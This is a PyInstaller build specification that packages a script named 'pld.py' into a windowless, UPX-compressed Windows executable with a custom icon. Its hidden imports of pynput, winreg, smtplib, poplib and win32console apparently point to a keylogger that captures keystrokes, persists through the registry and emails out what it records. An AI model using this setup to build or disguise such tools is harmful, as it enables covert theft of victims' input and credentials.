# -*- mode: python ; coding: utf-8 -*-


a = Analysis(
    ['pld.py'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=[
        'os',
        'sys',
        'win32comext.shell.shell',
        'pynput',
        'datetime',
        'winreg',
        'smtplib',
        'poplib',
        'email',
        'email.header',
        'win32gui',
        'win32console',
        'pywintypes',
    ],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='pld',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=['bas.ico'],
)
